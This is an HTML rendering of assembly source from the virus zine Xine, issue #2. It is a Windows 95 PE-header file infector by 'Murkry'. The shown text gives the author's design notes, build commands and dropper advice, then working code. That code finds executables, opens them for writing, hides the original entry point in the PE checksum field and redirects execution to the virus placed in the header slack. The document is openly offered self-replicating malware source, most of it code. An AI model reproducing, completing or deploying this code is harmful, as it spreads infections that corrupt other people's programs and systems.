<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>host1.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 022 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   PE header section  Infector</span><span class="sc0">
</span><span class="sc1">;    by Murkry another first</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;This virus is based on the idea that the unused space in a PE header was </span><span class="sc0">
</span><span class="sc1">;still loaded into memory.  This area differs but averages around 400 bytes</span><span class="sc0">
</span><span class="sc1">;This seemed like enough room and if you use the trick of hardcoding the</span><span class="sc0">
</span><span class="sc1">;address of the API's, well it works.  Though I found that the files that</span><span class="sc0">
</span><span class="sc1">;had the PE header at 80 had enough space but the dead area went over the</span><span class="sc0">
</span><span class="sc1">;200 bytes segment so I need to enlarge the area that was loaded into memory</span><span class="sc0">
</span><span class="sc1">; I did this by increasing the header size by 200 I do not use all this space</span><span class="sc0">
</span><span class="sc1">;but need it for the virus is about 400 bytes. Anyway this a basicly useless</span><span class="sc0">
</span><span class="sc1">;virus since if any of the win api's are moved blam its dead. But it does</span><span class="sc0">
</span><span class="sc1">;demostrate some ideas like moving the entry point above the code section</span><span class="sc0">
</span><span class="sc1">;works fine actauly if the MZ area was bigger the whole thing could be </span><span class="sc0">
</span><span class="sc1">;written there. Ah forget it some other Virii genius will make PE infectors </span><span class="sc0">
</span><span class="sc1">;which are twice as small but till then ...</span><span class="sc0">
</span><span class="sc1">;Murkry</span><span class="sc0">


</span><span class="sc1">;Simple Section Infector PE Win95 virus</span><span class="sc0">
</span><span class="sc1">;does not expand or add a section simple uses the unused space in the</span><span class="sc0">
</span><span class="sc1">;header. ok,</span><span class="sc0">
</span><span class="sc1">;to compile make a batch file with these commands {without the ;}</span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m3 host1,,;</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe /aa /c host1,host1,, import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; then you need to put 118F in the checksum of course if you modify it</span><span class="sc0">
</span><span class="sc1">; then you need to put that rva for HERE in that checksum</span><span class="sc0">

</span><span class="sc1">;need to set the checksum to 8f 11 00 00 (offset 58 in the PE header)</span><span class="sc0">
</span><span class="sc1">;checksum is used to hold the old entry point</span><span class="sc0">

</span><span class="sc1">;will not reinfect file cause of check of the entry point if this entry point</span><span class="sc0">
</span><span class="sc1">; is 1000 or greater Header has not  infected the file</span><span class="sc0">
</span><span class="sc1">;since the Header infected file will be less than this 260 or 270 entry point</span><span class="sc0">

</span><span class="sc1">;*** note if you execute the virus in the header95.exe file which is a </span><span class="sc0">
</span><span class="sc1">;compiled dropper you mite want to rename it due to the way the virus infects </span><span class="sc0">
</span><span class="sc1">;it will infect itself and only work once, so rename it to *.com so it will </span><span class="sc0">
</span><span class="sc1">;not infect itself. And you can use it over and over</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;Definitions for the virus</span><span class="sc0">



</span><span class="sc5">MAX_PATH</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">255H</span><span class="sc0">       </span><span class="sc1">;maximum path length in Win 95/NT</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;flag for CreateFile to open existing file</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000H</span><span class="sc0">  </span><span class="sc1">;flags for CreateFile</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000H</span><span class="sc0">
</span><span class="sc5">FATTR_NORMAL</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;normal file attribute for CreateFile</span><span class="sc0">

</span><span class="sc5">PE_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">248</span><span class="sc0">           </span><span class="sc1">;size of PE file header</span><span class="sc0">
</span><span class="sc5">SEC_SIZE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40</span><span class="sc0">            </span><span class="sc1">;size of a section header</span><span class="sc0">

</span><span class="sc1">;Stack frame definitions:</span><span class="sc0">
</span><span class="sc5">SRCH_HANDLE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;handle for file search functions</span><span class="sc0">
</span><span class="sc5">TEMP</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">SRCH_HANDLE</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;temporary storage location</span><span class="sc0">
</span><span class="sc5">FHANDLE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;handle for file open/read/write/close</span><span class="sc0">
</span><span class="sc5">IOBYTES</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FHANDLE</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FIND_DATA</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">IOBYTES</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;file search data structure</span><span class="sc0">
</span><span class="sc1">;typedef struct _WIN32_FIND_DATA {</span><span class="sc0">
</span><span class="sc1">;   DWORD dwFileAttributes;</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftCreationTime;            ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastAccessTime;          ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastWriteTime;           ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeHigh;</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeLow;</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved0;</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved1;</span><span class="sc0">
</span><span class="sc1">;   CHAR cFileName[MAX_PATH];</span><span class="sc0">
</span><span class="sc1">;   CHAR cAlternateFileName[ 14 ];</span><span class="sc0">
</span><span class="sc1">;} WIN32_FIND_DATA</span><span class="sc0">
</span><span class="sc5">FILEBUF</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FIND_DATA</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">+</span><span class="sc5">MAX_PATH</span><span class="sc0">
</span><span class="sc5">TEMP1</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FILEBUF</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc0"> 
</span><span class="sc5">WORKSP</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">TEMP1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> 




</span><span class="sc1">;Define the needed external functions and constants here.</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">dummy</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;just so tasm will compile it </span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">
 
</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ALL WIN95 THAT i HAVE SEEN START WITH EAX = EIP</span><span class="sc0">
</span><span class="sc1">; THIS IS JUSTING USEING THIS METHOD INSTEAD OF THE STANDARD CALL POP SUB...</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">                 </span><span class="sc1">;EDI = THE OFFSET OF HOST</span><span class="sc0">
                
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WORKSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FIND_DATA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;A PLACE TO FOR WIN95 TO PUT THE  </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;FINDDATA STRUCTURE INFO</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FILE_EXE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;FILE WE ARE LOOKING FOR</span><span class="sc0">

  
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;THE CALL TO THE FIND FIRST</span><span class="sc0">

 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;IF THIS THEN NO FILES TO FIND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH_HANDLE</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;STORE THE HANDLE</span><span class="sc0">

</span><span class="sc5">GoForIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TryTo</span><span class="sc0">                      </span><span class="sc1">;TRY TO INFECT IT</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FIND_DATA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;TRY TO FIND SECOND FILE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH_HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                                           
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">FSecond</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;IF NO ZERO IT FOUND SOMETHING</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GoForIt</span><span class="sc0">


</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WORKSP</span><span class="sc0">              </span><span class="sc1">;ALL DONE EXIT</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">                     </span><span class="sc1">;RESTORE THE STACK</span><span class="sc0">
 
         
                      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;return to host</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">                                     </span><span class="sc1">;has added benefit</span><span class="sc0">
                                                </span><span class="sc1">;of eax = eip on startup</span><span class="sc0">
                                                </span><span class="sc1">;like win95 does anyway</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------ </span><span class="sc0">

</span><span class="sc5">TryTo</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;OPEN THE FILE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc5">FIND_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;LOC OF THE FILENAME</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                                         
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">TRYTO_RET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;NO GOOD</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">HeyALiveOne</span><span class="sc0">             </span><span class="sc1">;HEY ITS OPEN</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;******************************************</span><span class="sc0">

</span><span class="sc5">HeyALiveOne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">      </span><span class="sc1">;SAVE THE HANDLE</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILEBUF</span><span class="sc0">              </span><span class="sc1">;GET READY TO READ THE FILE</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">                  </span><span class="sc1">;READ 400H BYTES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;INTO THE BUFFER</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_READ</span><span class="sc0">
        </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc10">ERROR</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ok we got a file check for</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">;location of the PE header</span><span class="sc0">

         
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TEMP1</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get it and make esi new refrence</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;point</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">                 </span><span class="sc1">;is it the PE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">ERROR</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">028H</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;GET THE ORGINAL ENTRYPOINT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0900H</span><span class="sc0">
        </span><span class="sc6">JL</span><span class="sc0">      </span><span class="sc10">ERROR</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">58H</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">  </span><span class="sc1">;SAVE THIS in the checksum</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">;MAKES AX INTO EAX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">;SIZE OF THE SECTION HEADER </span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;ENTRY</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TEMP1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">268h</span><span class="sc0">                        </span><span class="sc1">;COMMON FOR win95 exe</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">ms_hder</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">TEMP1</span><span class="sc4">],</span><span class="sc2">0100H</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">ERROR</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2c0H</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">ERROR</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">54H</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;SIZE OF HEADER</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0400H</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">ERROR</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">54H</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">borland</span><span class="sc0">

</span><span class="sc5">ms_hder</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">270h</span><span class="sc0">                </span><span class="sc1">;amount to write to</span><span class="sc0">

</span><span class="sc5">borland</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">028H</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">  </span><span class="sc1">;SET THE VIRUS ENTRYPOINT</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">Ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILEBUF</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;buffer to write from</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;startting at this file position</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SEEKWrite</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">               </span><span class="sc1">;amount to write</span><span class="sc0">
